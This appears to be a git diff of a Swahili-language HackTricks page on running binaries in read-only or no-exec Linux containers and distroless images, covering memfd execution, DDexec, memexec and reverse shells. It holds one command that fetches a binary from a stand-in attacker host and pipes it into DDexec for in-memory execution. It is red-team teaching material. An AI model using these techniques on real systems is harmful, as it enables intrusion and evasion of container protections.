@@ -2,17 +2,16 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-
 ## Videos
 
-Katika videos zifuatazo unaweza kupata mbinu zilizotajwa kwenye ukurasa huu zikielezwa kwa kina zaidi:
+Katika videos zifuatazo unaweza kupata techniques zilizotajwa kwenye ukurasa huu zikielezwa kwa kina zaidi:<sup>[[1]](#references)[[2]](#references)</sup>
 
-- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
+- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
+- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>
 
 ## read-only / no-exec scenario
 
-Inazidi kuwa kawaida kukutana na mashine za Linux zilizowekwa **read-only (ro) file system protection**, hasa kwenye containers. Hii ni kwa sababu kuendesha container yenye ro file system ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** katika `securitycontext`:
+Inazidi kuwa kawaida kukutana na linux machines zilizo-mountiwa kwa **read-only (ro) file system protection**, hasa kwenye containers. Hii ni kwa sababu kuendesha container yenye ro file system ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** kwenye `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -27,37 +26,37 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Hata hivyo, hata kama file system ime-mountiwa kama ro, **`/dev/shm`** bado itaweza kuandikiwa, kwa hiyo si kweli kwamba hatuwezi kuandika chochote kwenye disk. Hata hivyo, folder hii ita-mountiwa ikiwa na **no-exec protection**, kwa hiyo ukidownload binary hapa **hutaweza kui-execute**.
+Hata hivyo, hata kama file system ime-mountiwa kama ro, **`/dev/shm`** bado itaweza kuandikiwa, kwa hiyo si kweli kwamba hatuwezi kuandika chochote kwenye disk. Hata hivyo, folder hii itakuwa **mounted with no-exec protection**, kwa hiyo ukidownload binary hapa **hutaweza kui-execute**.
 
 > [!WARNING]
-> Kwa mtazamo wa red team, hii hufanya iwe **ngumu kudownload na ku-execute** binaries ambazo hazipo tayari kwenye mfumo (kama backdoors au enumerators kama `kubectl`).
+> Kwa mtazamo wa red team, hii inafanya iwe **ngumu kudownload na ku-execute** binaries ambazo hazipo tayari kwenye system (kama backdoors au enumerators kama `kubectl`).
 
 ## Easiest bypass: Scripts
 
-Kumbuka kwamba nilitaja binaries; unaweza **ku-execute script yoyote** mradi interpreter yake ipo ndani ya mashine, kama **shell script** ikiwa `sh` ipo au **python** **script** ikiwa `python` imewekwa.
+Kumbuka kwamba nilitaja binaries; unaweza **ku-execute script yoyote** mradi interpreter yake iko ndani ya machine, kama **shell script** ikiwa `sh` ipo au **python** **script** ikiwa `python` imewekwa.
 
-Hata hivyo, hii pekee haitoshi ku-execute binary backdoor yako au binary tools nyingine unazoweza kuhitaji kuendesha.
+Hata hivyo, hii pekee haitoshi ku-execute binary backdoor yako au binary tools nyingine unazoweza kuhitaji ku-run.
 
 ## Memory Bypasses
 
-Ikiwa unataka ku-execute binary lakini file system hairuhusu hilo, njia bora ya kufanya hivyo ni **kui-execute kutoka kwenye memory**, kwa sababu **protections hazitumiki huko**.
+Ukitaka ku-execute binary lakini file system hairuhusu, njia bora ya kufanya hivyo ni **kui-execute kutoka kwenye memory**, kwa sababu **protections hazitumiki huko**.
 
 ### FD + exec syscall bypass
 
-Ikiwa una script engines zenye uwezo mkubwa ndani ya mashine, kama **Python**, **Perl**, au **Ruby**, unaweza kudownload binary ya ku-execute kutoka kwenye memory, kuihifadhi katika memory file descriptor (`create_memfd` syscall), ambayo haitalindwa na protections hizo, kisha kuita **`exec` syscall** ukibainisha **fd kama file ya ku-execute**.
+Ikiwa una powerful script engines ndani ya machine, kama **Python**, **Perl**, au **Ruby**, unaweza kudownload binary ya ku-execute kutoka kwenye memory, kuihifadhi kwenye memory file descriptor (`create_memfd` syscall), ambayo haitalindwa na protections hizo, kisha uitishe **`exec` syscall** ukionyesha **fd kama file ya ku-execute**.
 
-Kwa hili unaweza kutumia kwa urahisi project ya [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kuipatia binary, nayo itazalisha script katika language iliyoonyeshwa ikiwa na **binary iliyocompressiwa na kusimbwa kwa b64**, pamoja na instructions za **kui-decode na ku-decompress** ndani ya **fd** iliyoundwa kwa kuita `create_memfd` syscall, na call ya **exec** syscall ili kuiendesha.
+Kwa hili unaweza kutumia kwa urahisi project ya [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kuipa binary, nayo itatengeneza script katika language iliyoonyeshwa ikiwa na **binary iliyocompressiwa na b64 encoded**, pamoja na instructions za **ku-decode na ku-decompress** ndani ya **fd** iliyotengenezwa kwa kuita `create_memfd` syscall, na call ya **exec** syscall ili kui-run.
 
 > [!WARNING]
-> Hii haifanyi kazi katika scripting languages nyingine kama PHP au Node kwa sababu hazina **njia ya kawaida ya kuita raw syscalls** kutoka kwenye script, kwa hiyo haiwezekani kuita `create_memfd` ili kuunda **memory fd** ya kuhifadhi binary.
+> Hii haifanyi kazi katika scripting languages nyingine kama PHP au Node kwa sababu hazina **default way to call raw syscalls** kutoka kwenye script, kwa hiyo haiwezekani kuita `create_memfd` ili kutengeneza **memory fd** ya kuhifadhi binary.
 >
-> Zaidi ya hayo, kuunda **regular fd** yenye file katika `/dev/shm` hakutafanya kazi, kwa sababu hutaruhusiwa kuiendesha kutokana na **no-exec protection** kutumika.
+> Zaidi ya hayo, kutengeneza **regular fd** yenye file katika `/dev/shm` hakutafanya kazi, kwa sababu hutaruhusiwa kui-run kutokana na **no-exec protection** kutumika.
 
 ### DDexec / EverythingExec
 
 [**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni technique inayokuruhusu **kubadilisha memory ya process yako mwenyewe** kwa ku-overwrite **`/proc/self/mem`**.
 
-Kwa hiyo, kwa **kudhibiti assembly code** inayotekelezwa na process, unaweza kuandika **shellcode** na "ku-mutate" process ili **i-execute code yoyote ya kiholela**.
+Kwa hiyo, kwa **kudhibiti assembly code** inayotekelezwa na process, unaweza kuandika **shellcode** na "ku-mutate" process ili **ku-execute arbitrary code yoyote**.
 
 > [!TIP]
 > **DDexec / EverythingExec** itakuruhusu kupakia na **ku-execute** **shellcode** yako mwenyewe au **binary yoyote** kutoka kwenye **memory**.
@@ -67,24 +66,23 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 ```
 Kwa maelezo zaidi kuhusu technique hii, angalia Github au:
 
-
 {{#ref}}
 ddexec.md
 {{#endref}}
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) ni hatua inayofuata kwa njia ya kawaida baada ya DDexec. Ni **DDexec shellcode iliyowekwa kama daemon**, kwa hiyo kila wakati unapotaka **kuendesha binary tofauti** huhitaji kuzindua upya DDexec; unaweza tu kuendesha memexec shellcode kupitia technique ya DDexec, kisha **kuwasiliana na daemon hii ili kupitisha binaries mpya za kupakia na kuendesha**.
+[**Memexec**](https://github.com/arget13/memexec) ni hatua inayofuata kwa kawaida ya DDexec. Ni **DDexec shellcode demonised**, hivyo kila unapotaka **run binary tofauti**, huhitaji kuzindua tena DDexec; unaweza tu ku-run memexec shellcode kupitia technique ya DDexec, kisha **kuwasiliana na daemon hii ili kupitisha binaries mpya za kupakia na ku-run**.
 
-Unaweza kupata mfano wa jinsi ya kutumia **memexec kuendesha binaries kutoka kwenye PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Unaweza kupata mfano wa jinsi ya kutumia **memexec ku-execute binaries kutoka kwenye PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-Kwa madhumuni yanayofanana na DDexec, technique ya [**memdlopen**](https://github.com/arget13/memdlopen) hutoa **njia rahisi zaidi ya kupakia binaries** kwenye memory ili kuzitekeleza baadaye. Inaweza hata kuruhusu kupakia binaries zenye dependencies.
+Kwa madhumuni yanayofanana na DDexec, technique ya [**memdlopen**](https://github.com/arget13/memdlopen) huruhusu **njia rahisi zaidi ya kupakia binaries** kwenye memory ili kuzitekeleza baadaye. Inaweza pia kuruhusu kupakia binaries zenye dependencies.
 
 ## Distroless Bypass
 
-Kwa maelezo maalum kuhusu **distroless ni nini hasa**, inasaidia lini, haisaidii lini, na jinsi inavyobadilisha mbinu za post-exploitation kwenye containers, angalia:
+Kwa maelezo maalum kuhusu **distroless ni nini hasa**, inasaidia lini, haisaidii lini, na jinsi inavyobadilisha post-exploitation tradecraft kwenye containers, angalia:
 
 {{#ref}}
 ../../../containers-namespaces/container-security/distroless.md
@@ -92,28 +90,32 @@ Kwa maelezo maalum kuhusu **distroless ni nini hasa**, inasaidia lini, haisaidii
 
 ### Distroless ni nini
 
-Distroless containers huwa na **components za msingi kabisa zinazohitajika kuendesha application au service mahususi**, kama vile libraries na runtime dependencies, lakini hazina components kubwa kama package manager, shell, au system utilities.
+Distroless containers huwa na **components za msingi kabisa zinazohitajika ku-run application au service maalum**, kama vile libraries na runtime dependencies, lakini huacha components kubwa kama package manager, shell, au system utilities.
 
-Lengo la distroless containers ni **kupunguza attack surface ya containers kwa kuondoa components zisizohitajika** na kupunguza idadi ya vulnerabilities zinazoweza kutumiwa.
+Lengo la distroless containers ni **kupunguza attack surface ya containers kwa kuondoa components zisizo za lazima** na kupunguza idadi ya vulnerabilities zinazoweza ku-exploitwa.
 
 ### Reverse Shell
 
-Katika distroless container huenda **usipate hata `sh` au `bash`** ili kupata shell ya kawaida. Pia hutapata binaries kama `ls`, `whoami`, `id`... kila kitu ambacho kwa kawaida huendesha kwenye system.
+Katika distroless container huenda **usipate hata `sh` au `bash`** ili kupata shell ya kawaida. Pia hutapata binaries kama `ls`, `whoami`, `id`... kila kitu ambacho kwa kawaida huwa una-run kwenye system.
 
 > [!WARNING]
-> Kwa hiyo, **hutaweza kupata** **reverse shell** au **ku-enumerate** system kama kawaida.
+> Kwa hiyo, **hutaweza kupata **reverse shell** au ku-**enumerate** system kama kawaida.
 
-Hata hivyo, ikiwa container iliyo-compromise inaendesha, kwa mfano, flask web, basi python imewekwa, na kwa hiyo unaweza kupata **Python reverse shell**. Ikiwa inaendesha node, unaweza kupata Node rev shell, na hali ni hiyo hiyo kwa karibu kila **scripting language**.
-
-> [!TIP]
-> Kwa kutumia scripting language unaweza **ku-enumerate system** kwa kutumia uwezo wa language hiyo.
-
-Ikiwa hakuna protections za **`read-only/no-exec`**, unaweza kutumia reverse shell yako vibaya ili **kuandika binaries zako kwenye file system** na **kuzitekeleza**.
+Hata hivyo, ikiwa container iliyo-compromise ina-run, kwa mfano, Flask web app, basi Python imewekwa, na hivyo unaweza kupata **Python reverse shell**. Ikiwa ina-run Node, unaweza kupata Node rev shell, na hali ni hiyo hiyo kwa karibu **scripting language** yoyote.
 
 > [!TIP]
-> Hata hivyo, katika aina hii ya containers protections hizi kwa kawaida zitakuwepo, lakini unaweza kutumia **previous memory execution techniques kuzipita**.
+> Kwa kutumia scripting language unaweza **ku-**enumerate system** ukitumia uwezo wa language hiyo.
 
-Unaweza kupata **examples** za jinsi ya **kutumia baadhi ya vulnerabilities za RCE** ili kupata **reverse shells** za scripting languages na kuendesha binaries kutoka memory katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Ikiwa hakuna protections za **`read-only/no-exec`**, unaweza kutumia reverse shell yako vibaya **kuandika binaries zako kwenye file system** na **kuzitekeleza**.
 
+> [!TIP]
+> Hata hivyo, katika aina hii ya containers protections hizi kwa kawaida zitakuwepo, lakini unaweza kutumia **mbinu za awali za memory execution kuzipita**.
+
+Unaweza kupata **mifano** ya jinsi ya **ku-exploit baadhi ya vulnerabilities za RCE** ili kupata **reverse shells** za scripting languages na ku-execute binaries kutoka memory katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+
+## Marejeo
+
+- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
+- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
 {{#include ../../../../banners/hacktricks-training.md}}
